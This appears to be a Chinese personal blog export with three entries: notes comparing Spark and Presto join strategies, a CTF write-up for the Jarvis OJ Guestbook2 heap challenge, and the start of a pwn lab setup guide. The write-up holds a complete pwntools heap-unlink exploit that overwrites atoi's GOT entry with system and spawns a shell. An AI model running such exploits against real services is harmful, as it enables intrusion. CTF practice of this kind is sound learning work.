<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">== Physical Plan ==</span><br><span class="line">*(3) HashAggregate(keys=[event#445], functions=[max(price#395), max(size#281)])</span><br><span class="line">+- Exchange hashpartitioning(event#445, 200)</span><br><span class="line">   +- *(2) HashAggregate(keys=[event#445], functions=[partial_max(price#395), partial_max(size#281)])</span><br><span class="line">      +- *(2) Project [size#281, price#395, event#445]</span><br><span class="line">         +- *(2) BroadcastHashJoin [id_s#275L], [cast(id#391 as bigint)], Inner, BuildLeft</span><br><span class="line">            :- BroadcastExchange HashedRelationBroadcastMode(List(input[0, bigint, false]))</span><br><span class="line">            :  +- *(1) Filter isnotnull(id_s#275L)</span><br><span class="line">            :     +- Scan hive small table [id_s#275L, size#281], HiveTableRelation `mysql`.`mediav_base_adspace`, org.apache.hadoop.hive.serde2.lazy.LazySimpleSerDe, [id#269L, name#270, qihu_adspaceid#271L, memo#272, url#273, fixedbannerid#274L, id_s#275L, channelid#276L, disabled#277, width#278, height#279, dimension#280, size#281, bannertypeid#282, pagetype#283, placement#284, spellrate#285, pv#286L, uv#287L, manualflag#288, wh#289, virtual#290L, sflag#291, acceptsize#292, ... 75 more fields]</span><br><span class="line">            +- *(2) Project [id#391, price#395, event#445]</span><br><span class="line">               +- *(2) Filter ((isnotnull(hour#370) &amp;&amp; (cast(hour#370 as int) = 12)) &amp;&amp; isnotnull(id#391))</span><br><span class="line">                  +- *(2) FileScan orc big_table[hour#370,id#391,price#395,date#444,event#445] Batched: true, Format: ORC, Location: PrunedInMemoryFileIndex[viewfs://ss-hadoop/mvad/warehouse/mediav_base.db/maxfact/date=2021-06-20/..., PartitionCount: 4, PartitionFilters: [isnotnull(date#444), (date#444 = 2021-06-20)], PushedFilters: [IsNotNull(hour), IsNotNull(id)], ReadSchema: struct&lt;hour:tinyint,id:int,price:int&gt;</span><br><span class="line">Time taken: 10.342 seconds, Fetched 1 row(s)</span><br></pre></td></tr></table></figure>

<p>整理一下执行流程，如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--big join small</span><br><span class="line">BroadcastHashJoin [cast(id#27 as bigint)], [id_s#88L], Inner, BuildRight</span><br><span class="line"></span><br><span class="line">FileScan orc big_table Batched: true Location: PrunedInMemoryFileIndex</span><br><span class="line"></span><br><span class="line">BroadcastExchange HashedRelationBroadcastMode(List(input[0, bigint, false]))</span><br><span class="line"></span><br><span class="line">Scan hive small table</span><br><span class="line"></span><br><span class="line">--small join big</span><br><span class="line">BroadcastHashJoin [id_s#275L], [cast(id#391 as bigint)], Inner, BuildLeft</span><br><span class="line"></span><br><span class="line">BroadcastExchange HashedRelationBroadcastMode(List(input[0, bigint, false]))</span><br><span class="line"></span><br><span class="line">Scan hive small table</span><br><span class="line"></span><br><span class="line">FileScan orc big_table Batched: true Location: PrunedInMemoryFileIndex</span><br></pre></td></tr></table></figure>

<p>可以看到关键部分的结果是一样的，因为开启了一些默认优化的机制。</p>
<p>Spark will perform (or be forced by us to perform) joins in two different ways: either using <strong>Sort Merge Joins</strong> if we are joining two big tables, or <strong>Broadcast Joins</strong> if at least one of the datasets involved is small enough to be stored in the memory of the single all executors.</p>
<h4 id="Broadcast-Hash-Join"><a href="#Broadcast-Hash-Join" class="headerlink" title="Broadcast Hash Join"></a>Broadcast Hash Join</h4><p><a href="https://imgtu.com/i/WpGfld"><img src="https://z3.ax1x.com/2021/07/10/WpGfld.jpg" alt="WpGfld.jpg"></a></p>
<p>Broadcast Hash Join 的实现是将小表的数据广播到 Spark 所有的 Executor 端，这个广播过程和我们自己去广播数</p>
<p>据没什么区别：</p>
<ul>
<li>利用 collect 算子将小表的数据从 Executor 端拉到 Driver 端 </li>
<li>在 Driver 端调用 sparkContext.broadcast 广播到所有 Executor 端 </li>
<li>在 Executor 端使用广播的数据与大表进行 Join 操作（实际上是执行map操作）</li>
</ul>
<p>这种 Join 策略避免了 Shuffle 操作。一般而言，Broadcast Hash Join 会比其他 Join 策略执行的要快。</p>
<p>使用这种 Join 策略必须满足以下条件：</p>
<ul>
<li>小表的数据必须很小，可以通过 spark.sql.autoBroadcastJoinThreshold 参数来配置，默认是 10MB</li>
<li>如果内存比较大，可以将阈值适当加大</li>
<li>将 spark.sql.autoBroadcastJoinThreshold 参数设置为 -1，可以关闭这种连接方式</li>
<li>只能用于等值 Join，不要求参与 Join 的 keys 可排序</li>
</ul>
<h4 id="Shuffle-Hash-Join"><a href="#Shuffle-Hash-Join" class="headerlink" title="Shuffle Hash Join"></a>Shuffle Hash Join</h4><p>当表中的数据比较大，又不适合使用广播，这个时候就可以考虑使用 Shuffle Hash Join。</p>
<p>Shuffle Hash Join 同样是在大表和小表进行 Join 的时候选择的一种策略。它的计算思想是：把大表和小表按照相同的分区算法和分区数进行分区（根据参与 Join 的 keys 进行分区），这样就保证了 hash 值一样的数据都分发到同一个分区中，然后在同一个 Executor 中两张表 hash 值一样的分区就可以在本地进行 hash Join 了。在进行 Join 之前，还会对小表的分区构建 Hash Map。Shuffle hash join 利用了分治思想，把大问题拆解成小问题去解决。</p>
<p><a href="https://imgtu.com/i/WpGWSH"><img src="https://z3.ax1x.com/2021/07/10/WpGWSH.jpg" alt="WpGWSH.jpg"></a></p>
<p>要启用 Shuffle Hash Join 必须满足以下条件：</p>
<ul>
<li>仅支持等值 Join，不要求参与 Join 的 Keys 可排序</li>
<li>spark.sql.join.preferSortMergeJoin 参数必须设置为 false，参数是从 Spark 2.0.0 版本引入的，默认值为true，也就是默认情况下选择 Sort Merge Join小表的大小（plan.stats.sizeInBytes）必须小于 spark.sql.autoBroadcastJoinThreshold *spark.sql.shuffle.partitions（默认值200mb）</li>
<li>而且小表大小（stats.sizeInBytes）的三倍必须小于等于大表的大小（stats.sizeInBytes），也就是a.stats.sizeInBytes * 3 &lt; = b.stats.sizeInBytes</li>
</ul>
<h4 id="Shuffle-Sort-Merge-Joins"><a href="#Shuffle-Sort-Merge-Joins" class="headerlink" title="Shuffle Sort Merge Joins"></a>Shuffle Sort Merge Joins</h4><p>前面两种 Join 策略对表的大小都有条件的，如果参与 Join 的表都很大，这时候就得考虑用 Shuffle Sort Merge Join了。</p>
<p>Shuffle Sort Merge Join 的实现思想：</p>
<ul>
<li>将两张表按照 join key 进行shuffle，保证join key值相同的记录会被分在相应的分区对每个分区内的数据进行排序</li>
<li>排序后再对相应的分区内的记录进行连接</li>
<li>无论分区有多大，Sort Merge Join都不用把一侧的数据全部加载到内存中，而是即用即丢；因为两个序列都有序。从头遍历，碰到key相同的就输出，如果不同，左边小就继续取左边，反之取右边。从而大大提高了大数据量下sql join的稳定性。</li>
</ul>
<p><a href="https://imgtu.com/i/WpGgYD"><img src="https://z3.ax1x.com/2021/07/10/WpGgYD.jpg" alt="WpGgYD.jpg"></a></p>
<p>要启用 Shuffle Sort Merge Join 必须满足以下条件：</p>
<ul>
<li>仅支持等值 Join，并且要求参与 Join 的 Keys 可排序</li>
</ul>
<h4 id="Cartesian-product-join"><a href="#Cartesian-product-join" class="headerlink" title="Cartesian product join"></a>Cartesian product join</h4><p>如果 Spark 中两张参与 Join 的表没指定连接条件，那么会产生 Cartesian product join，这个 Join 得到的结果其实就是两张表行数的乘积。</p>
<p>因为数据量普遍很大，严禁使用！</p>
<h3 id="presto"><a href="#presto" class="headerlink" title="presto"></a>presto</h3><p>执行计划关键是下面这段。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Fragment 2 [HASH]</span><br><span class="line">    Output layout: [event, max_15, max_14, $hashvalue_22]</span><br><span class="line">    Output partitioning: HASH [event][$hashvalue_22]</span><br><span class="line">    Stage Execution Strategy: UNGROUPED_EXECUTION</span><br><span class="line">    - Aggregate(PARTIAL)[event][$hashvalue_22] =&gt; [event:varchar, $hashvalue_22:bigint, max_15:bigint, max_14:bigint]</span><br><span class="line">            max_15 := &quot;&quot;presto.default.max&quot;&quot;((size))</span><br><span class="line">            max_14 := &quot;&quot;presto.default.max&quot;&quot;((price))</span><br><span class="line">        - Project[projectLocality = LOCAL] =&gt; [price:integer, event:varchar, size:integer, $hashvalue_22:bigint]</span><br><span class="line">                Estimates: &#123;rows: ? (?), cpu: ?, memory: 0.00, network: ?&#125;</span><br><span class="line">                $hashvalue_22 := combine_hash(BIGINT 0, COALESCE($operator$hash_code(event), BIGINT 0))</span><br><span class="line">            - InnerJoin[(&quot;&quot;expr&quot;&quot; = &quot;&quot;id_s&quot;&quot;)][$hashvalue_17, $hashvalue_19] =&gt; [price:integer, event:varchar, size:integer]</span><br><span class="line">                    Estimates: &#123;rows: ? (?), cpu: ?, memory: 0.00, network: ?&#125;</span><br><span class="line">                    Distribution: PARTITIONED</span><br><span class="line">                - RemoteSource[3] =&gt; [price:integer, event:varchar, expr:bigint, $hashvalue_17:bigint]</span><br><span class="line">                - LocalExchange[HASH][$hashvalue_19] (id_s) =&gt; [id_s:bigint, size:integer, $hashvalue_19:bigint]</span><br><span class="line">                        Estimates: &#123;rows: 0 (0B), cpu: 0.00, memory: 0.00, network: 0.00&#125;</span><br><span class="line">                    - RemoteSource[4] =&gt; [id_s:bigint, size:integer, $hashvalue_20:bigint]</span><br></pre></td></tr></table></figure>

<p>Presto中 join 的默认算法是broadcast join，即将 join 左边的表分割到多个 worker ，然后将join 右边的表数据整个复制一份发送到每个worker进行计算。如果右边的表数据量太大，则可能会报内存溢出错误。</p>
<p>在默认情况下，presto使用distributed hash join算法，在这种算法中，join左右两边的表都会根据join键的值进行分区。左表的每个分区都会被通过网络传入到右表所在分区的worker节点上。也就是说，在进行join关联的时候，会先把右表的所有分区全部分布到各个计算节点上保存，然后等待将左表中的各个分区依次通过网络传输stream 到相应的计算节点上进行计算。由于右表的所有分区需要全部分布到各个节点上进行存储，所以有一个限制：就是集群中所有内存的代销一定要大于右表的大小。</p>
<p>如果你在执行join查询的时候看到错误：task exceeded max memory size，那么这经常意味着join连接的右表大于集群所有内存的大小。presto不会自动进行join两边表 顺序的优化，因此在执行join查询的时候，请确保<strong>大表放在join的左边</strong>，小表放在join右边。</p>
<p>必须注意这一点，因为没有像hive那样开启优化–默认将小表放入内存。</p>
]]></content>
      <tags>
        <tag>Big Data</tag>
      </tags>
  </entry>
  <entry>
    <title>Jarvis OJ---Guestbook2 WP</title>
    <url>/2019/02/09/Jarvis%20OJ---Guestbook2%20WP/</url>
    <content><![CDATA[<p>看一道Pwn题练习一下</p>
<p>参考文章：<a href="https://veritas501.space/2017/03/10/JarvisOJ_WP/">https://veritas501.space/2017/03/10/JarvisOJ_WP/</a>     v爷爷nb</p>
<span id="more"></span>

<p>没有开启PIE，不错</p>
<p>程序一共有五个功能，本身没有后门函数给我们利用，要泄露地址，在堆上泄露地址还从来没尝试过（因为我不会）</p>
<p>在bss字段0x6020A8处，会有一个指针指向一开始创建的堆首地址</p>
<p>我们结合new操作以及list操作的函数，其实可以把整个guestbook的结构体分析出来</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk_list</span>  // <span class="title">size</span> 0<span class="title">x1810</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> limit; <span class="comment">// 最多256个</span></span><br><span class="line">    <span class="keyword">int</span> num; <span class="comment">// the number of built guestbooks</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">guestbook</span> // <span class="title">size</span> 0<span class="title">x18</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> use_or_not;</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">    <span class="keyword">int</span> ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来就是在各个函数中找漏洞了</p>
<p>Delete函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *(chunk_list + <span class="number">8</span>) &lt;= <span class="number">0LL</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;No posts yet.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Post number: &quot;</span>);</span><br><span class="line">  v1 = sub_40094E();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= *chunk_list )   <span class="comment">// 没有检查guestbook是否已经被释放</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid number!&quot;</span>);</span><br><span class="line">  --*(chunk_list + <span class="number">8</span>);</span><br><span class="line">  *(chunk_list + <span class="number">24LL</span> * v1 + <span class="number">16</span>) = <span class="number">0LL</span>;</span><br><span class="line">  *(chunk_list + <span class="number">24LL</span> * v1 + <span class="number">24</span>) = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">free</span>(*(chunk_list + <span class="number">24LL</span> * v1 + <span class="number">32</span>)); <span class="comment">// free 之后没赋0</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Edit函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> len; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> num; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Post number: &quot;</span>);</span><br><span class="line">  num = sub_40094E();</span><br><span class="line">  <span class="comment">// 检查了guestbook是否被释放</span></span><br><span class="line">  <span class="keyword">if</span> ( num &lt; <span class="number">0</span> || num &gt;= *chunk_list || *(chunk_list + <span class="number">24LL</span> * num + <span class="number">16</span>) != <span class="number">1LL</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid number!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Length of post: &quot;</span>);</span><br><span class="line">  len = sub_40094E();</span><br><span class="line">  <span class="keyword">if</span> ( len &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid length!&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( len &gt; <span class="number">0x1000</span> )</span><br><span class="line">    len = <span class="number">0x1000</span>;</span><br><span class="line">  <span class="keyword">if</span> ( len != *(chunk_list + <span class="number">24LL</span> * num + <span class="number">24</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = chunk_list;</span><br><span class="line">    *(v1 + <span class="number">24LL</span> * num + <span class="number">32</span>) = <span class="built_in">realloc</span>(*(chunk_list + <span class="number">24LL</span> * num + <span class="number">32</span>), (<span class="number">0x80</span> - len % <span class="number">0x80</span>) % <span class="number">0x80</span> + len);  <span class="comment">// 长度会对齐为0x80的整数倍</span></span><br><span class="line">    *(chunk_list + <span class="number">24LL</span> * num + <span class="number">24</span>) = len;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter your post: &quot;</span>);</span><br><span class="line">  sub_40085D(*(chunk_list + <span class="number">24LL</span> * num + <span class="number">32</span>), len);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来打算一边写exp，一边写注释来理解，毕竟我是真的不懂堆</p>
<h2 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h2><p>先来第一个步骤吧，就是leak出heap的base地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;bash&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	cn = process(<span class="string">&#x27;./guestbook2&#x27;</span>)</span><br><span class="line">	<span class="built_in">bin</span> = ELF(<span class="string">&#x27;./guestbook2&#x27;</span>)</span><br><span class="line">	libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">	<span class="comment">#libc = ELF(&#x27;/lib/i386-linux-gnu/libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	cn = remote(<span class="string">&#x27;pwn.jarvisoj.com&#x27;</span>,<span class="number">9879</span>)</span><br><span class="line">	<span class="built_in">bin</span> = ELF(<span class="string">&#x27;./guestbook2&#x27;</span>)</span><br><span class="line">	<span class="comment">#libc = ELF(&#x27;&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span>(<span class="params">a=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">	gdb.attach(cn,a)</span><br><span class="line">	<span class="keyword">if</span> a == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">		raw_input()</span><br><span class="line"></span><br><span class="line"><span class="comment"># write function first</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list</span>():</span></span><br><span class="line">    cn.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">New</span>(<span class="params">length,content</span>):</span></span><br><span class="line">    cn.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">&#x27;Length&#x27;</span>)</span><br><span class="line">    cn.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    cn.recvuntil(<span class="string">&#x27;Enter&#x27;</span>)</span><br><span class="line">    cn.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span>(<span class="params">idx,length,content</span>):</span></span><br><span class="line">    cn.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">&#x27;number: &#x27;</span>)</span><br><span class="line">    cn.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    cn.recvuntil(<span class="string">&#x27;Length&#x27;</span>)</span><br><span class="line">    cn.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    cn.recvuntil(<span class="string">&#x27;Enter&#x27;</span>)</span><br><span class="line">    cn.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    cn.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">&#x27;number: &#x27;</span>)</span><br><span class="line">    cn.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">chunk_list = <span class="number">0x00000000006020A8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># New 5 guestbook</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    New(<span class="number">0x80</span>,<span class="built_in">str</span>(i)*<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Delete 3 and 1</span></span><br><span class="line">Delete(<span class="number">3</span>)</span><br><span class="line">Delete(<span class="number">1</span>)  <span class="comment"># make the fd of the guestbbok1 points to guestbook3</span></span><br><span class="line">payload = <span class="number">0x80</span>*<span class="string">&#x27;0&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">Edit(<span class="number">0</span>,<span class="number">0x90</span>,payload) <span class="comment"># cover prev_size and size of the guestbook1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak addr</span></span><br><span class="line"><span class="built_in">list</span>()</span><br><span class="line">cn.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">leak_data = cn.recvuntil(<span class="string">&#x27;\x0a&#x27;</span>)[:-<span class="number">1</span>] <span class="comment"># \n 因为printf遇到0才会截断读取，所以会继续泄露fd</span></span><br><span class="line">cn.recv()</span><br><span class="line">leak_addr = u64(leak_data + <span class="string">&#x27;\x00&#x27;</span>*(<span class="number">8</span>-<span class="built_in">len</span>(leak_data))) <span class="comment"># guestbook3</span></span><br><span class="line">heap_base = leak_addr - <span class="number">0x19d0</span> <span class="comment"># offset 0x1820+0x90*3=0x19d0</span></span><br><span class="line">chunk0_addr = heap_base+<span class="number">0x30</span> <span class="comment"># 0x08*6=0x30</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;leak_addr: &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;heap_base: &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;chunk0_addr: &quot;</span>+<span class="built_in">hex</span>(chunk0_addr))</span><br></pre></td></tr></table></figure>

<h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><p>接下来就是unlink了，几个月前我曾尝试弄懂，可惜我失败了</p>
<p>这里最开始创建的大小的0x80，128个字节，所以之后realloc后，还是当作fast bin来处理</p>
<p>free时的操作</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(chunk)</span><br><span class="line"><span class="keyword">if</span>(prev_chunk == freed)</span><br><span class="line">    unlink(prev_chunk)         <span class="comment">//将两个chunk合并</span></span><br><span class="line"><span class="keyword">if</span>(next_chunk == top_chunk)</span><br><span class="line">    ......                     <span class="comment">//合并到top_chunk</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(next_chunk == freed)</span><br><span class="line">    unlink(next_chunk)         <span class="comment">//将两个chunk合并</span></span><br><span class="line">to_unsortbin(chunk)            <span class="comment">//将经过处理合并后的chunk归入unsortbin</span></span><br></pre></td></tr></table></figure>

<p>这其实就涉及到了unlink时可能会进行的合并操作</p>
<h4 id="1-检查是否可以向后合并"><a href="#1-检查是否可以向后合并" class="headerlink" title="1)检查是否可以向后合并"></a>1)检查是否可以向后合并</h4><p>首先需要检查 previous chunk 是否是空闲的（通过当前 chunk size 部分中的 flag 最低位去判断），在默认情况下，堆内存中的第一个chunk总是被设置为allocated的，即使它根本就不存在。</p>
<p>如果为free的话，那么就进行向后合并：</p>
<p>1)将前一个chunk占用的内存合并到当前chunk;</p>
<p>2)修改指向当前chunk的指针，改为指向前一个chunk。</p>
<p>3)使用unlink宏，将<strong>前一个free chunk</strong>从双向循环链表中移除。</p>
<p>前一个 chunk 是正在使用的，不满足向后合并的条件。</p>
<h4 id="2-检查是否可以向前合并"><a href="#2-检查是否可以向前合并" class="headerlink" title="2)检查是否可以向前合并"></a>2)检查是否可以向前合并</h4><p>在这里需要检查 next chunk 是否是空闲的(通过下下个 chunk 的flag的最低位去判断)，在找下下个chunk(这里的下、包括下下都是相对于 chunk first 而言的)的过程中，首先当前 chunk+ 当前 size 可以引导到下个 chunk ，然后从下个 chunk 的开头加上下个 chunk 的 size 就可以引导到下下个 chunk 。</p>
<p>如果我们把下个 chunk 的 size 覆盖为了-4**(32位)<strong>，那么它会认为下个 chunk 从 prev_size 开始就是下下个chunk了，既然已经找到了下下个 chunk ，那就就要去看看 size 的最低位以确定下个 chunk 是否在使用，当然这个 size 是 -4</strong>(11111100补码)** ，所以它指示下个 chunk 是空闲的。</p>
<p>在这个时候，就要发生向前合并了。即 first chunk 会和 first chunk 的下个 chunk (即 second chunk )发生合并。在此时会触发 <strong>unlink(second)</strong> 宏，想将 second 从它所在的 bin list 中解引用。</p>
<p>相关链接：<a href="https://www.jianshu.com/p/2776b6a79a11">https://www.jianshu.com/p/2776b6a79a11</a></p>
<p>如今的unlink</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">unlink(P, BK, FD) &#123;                                            </span><br><span class="line">    FD = P-&gt;fd;                                     </span><br><span class="line">    BK = P-&gt;bk;                                     </span><br><span class="line">    <span class="keyword">if</span>(__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>)) <span class="comment">//safe</span></span><br><span class="line">        malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P);      </span><br><span class="line">    <span class="keyword">else</span>&#123;                                   </span><br><span class="line">        FD-&gt;bk = BK;                                </span><br><span class="line">        BK-&gt;fd = FD;              </span><br><span class="line">       .........................................</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>道高一尺魔高一丈，精心伪造一个chunk，使FD-&gt;bk和BK-&gt;fd=P，这可以通过unlink检查</p>
<p>继续我们的exp，最后getshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># unlink</span></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0x80</span>)+p64(chunk0_addr-<span class="number">0x18</span>)+p64(chunk0_addr-<span class="number">0x10</span>)+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span></span><br><span class="line">payload+=p64(<span class="number">0x80</span>)+p64(<span class="number">0x90</span>)+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x70</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">Edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">Delete(<span class="number">1</span>) <span class="comment"># chunk0_addr=chunk0_addr-0x18</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc addr</span></span><br><span class="line">payload=p64(<span class="number">2</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0x100</span>)+p64(chunk0_addr-<span class="number">0x18</span>)</span><br><span class="line">payload+=p64(<span class="number">1</span>)+p64(<span class="number">0x8</span>)+p64(<span class="built_in">bin</span>.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">payload+=<span class="string">&#x27;\x00&#x27;</span>*(<span class="number">0x100</span>-<span class="built_in">len</span>(payload))</span><br><span class="line">Edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="built_in">list</span>()</span><br><span class="line">cn.recvuntil(<span class="string">&#x27;0. &#x27;</span>)</span><br><span class="line">cn.recvuntil(<span class="string">&#x27;1. &#x27;</span>)</span><br><span class="line">atoi=cn.recvuntil(<span class="string">&#x27;\x0a&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line">atoi_addr=atoi=u64(atoi+<span class="string">&#x27;\x00&#x27;</span>*(<span class="number">8</span>-<span class="built_in">len</span>(atoi)))</span><br><span class="line">cn.recv()</span><br><span class="line">system_addr=atoi_addr-libc.symbols[<span class="string">&#x27;atoi&#x27;</span>]+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;atoi_addr:&#x27;</span>+<span class="built_in">hex</span>(atoi_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;system_addr:&#x27;</span>+<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#write atoi to system &amp; get shell</span></span><br><span class="line">Edit(<span class="number">1</span>,<span class="number">8</span>,p64(system_addr)) </span><br><span class="line">cn.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure>



]]></content>
      <tags>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>PWN_环境搭建</title>
    <url>/2019/12/24/PWN-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<p>最近需要重新搭建一个PWN的环境来应对接下来的任务，就顺便记录一下，以防将来需要搭建的情况</p>
<span id="more"></span>

<h3 id="虚拟环境搭建"><a href="#虚拟环境搭建" class="headerlink" title="虚拟环境搭建"></a>虚拟环境搭建</h3><p>这里还是用乌班图16，我选的是中科大的镜像：<a href="http://mirrors.ustc.edu.cn/ubuntu-releases/16.04/">http://mirrors.ustc.edu.cn/ubuntu-releases/16.04/</a></p>
<p>然后就去VMWARE里去安装</p>
<p>安装完后有一个很大的困扰：Linux鼠标选定自动弹出 ^C,例如在Terminal里</p>
<p>用 xshell 时莫名奇妙发现一选中文本，xshell 就会自动发送一个 Ctrl+C 的命令，很是影响工作效率。</p>
<p>搜了一下，找到问题所在。</p>
<p>是因为安装了英文词典，词典会有取词功能，<strong>需要禁用取词功能</strong></p>
<p>简单来说，windows那边你开了一些词典，有划词翻译的功能，关掉就好</p>
<p>然后配置VMWARE TOOLS，流程还是比较容易的</p>
<p>接下来安装中文环境 <a href="https://www.cnblogs.com/chenmingjun/p/8506903.html">https://www.cnblogs.com/chenmingjun/p/8506903.html</a></p>
